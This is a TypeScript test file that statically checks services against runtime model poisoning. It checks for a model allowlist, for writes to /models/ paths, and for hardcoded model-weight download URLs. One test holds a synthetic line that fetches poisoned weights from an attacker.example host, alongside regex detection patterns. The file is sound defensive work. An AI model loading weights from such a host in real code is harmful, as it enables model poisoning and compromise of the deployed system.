/**
 * AITG-MOD-02 — Runtime Model Poisoning.
 *
 * The deployed model identity must be verifiable: every LLM provider call
 * lands at a known endpoint AND (for self-hosted models) the model artefact
 * has a hash that we can compare against a registry.
 *
 * Static enforcement:
 *   - llmRouter / providers do NOT accept attacker-controlled `model` IDs
 *     without an explicit allowlist (model_registry / chat_model_prefixes).
 *   - No service downloads model weights from an unauthenticated URL.
 *   - No service writes to `/models/` paths from a request handler.
 */

import { describe, test, expect } from 'vitest';
import { readFileSync, readdirSync, statSync, existsSync } from 'node:fs';
import { join, resolve, relative } from 'node:path';

const ROOT = process.cwd();

function walkServices(): string[] {
  const out: string[] = [];
  const dir = resolve(ROOT, 'services');
  if (!existsSync(dir)) return out;
  function visit(p: string): void {
    for (const e of readdirSync(p)) {
      const full = join(p, e);
      const s = statSync(full);
      if (s.isDirectory() && !e.includes('node_modules')) visit(full);
      else if (e.endsWith('.ts')) out.push(full);
    }
  }
  visit(dir);
  return out;
}

describe('AITG-MOD-02: runtime model identity is verifiable', () => {
  const files = walkServices();

  test('positive: chat_model_prefixes or model_registry pattern is honoured', () => {
    // config.ts in svc-ai-chat ships chatModelPrefixes — that's the allowlist signal.
    const cfg = resolve(ROOT, 'services/svc-ai-chat/src/config.ts');
    if (!existsSync(cfg)) return;
    const src = readFileSync(cfg, 'utf8');
    expect(src).toMatch(/chatModelPrefixes|modelPrefixes|modelRegistry|allowedModels/);
  });

  test('negative: no service writes to /models/ from a request handler', () => {
    const offenders: string[] = [];
    for (const f of files) {
      const rel = relative(ROOT, f);
      if (/\b(tests?|__tests__|spec)\b/.test(rel)) continue;
      const src = readFileSync(f, 'utf8');
      // Writes to /models/ path inside a request handler context (heuristic).
      if (/(?:writeFile|fs\.write|createWriteStream)[\s\S]{0,200}\/models\//.test(src)) {
        offenders.push(rel);
      }
    }
    expect(offenders).toEqual([]);
  });

  test('negative: no unauthenticated model download URL hardcoded', () => {
    const offenders: string[] = [];
    for (const f of files) {
      const rel = relative(ROOT, f);
      if (/\b(tests?|__tests__|spec)\b/.test(rel)) continue;
      const src = readFileSync(f, 'utf8');
      // Match http(s) URLs ending in known model-weight extensions outside string-literal scanning context.
      if (/https?:\/\/[^\s'"`<>]+\.(?:gguf|safetensors|bin|pt|ckpt)\b/i.test(src)) {
        offenders.push(rel);
      }
    }
    expect(
      offenders,
      `Hardcoded model weight URLs (potential runtime poisoning vector):\n${offenders.join('\n')}`,
    ).toEqual([]);
  });

  test('negative: detector catches a synthetic poisoning attempt', () => {
    const bad = `fetch("http://attacker.example/poisoned.safetensors")`;
    expect(/https?:\/\/[^\s'"`<>]+\.(?:gguf|safetensors|bin|pt|ckpt)\b/i.test(bad)).toBe(true);
  });
});
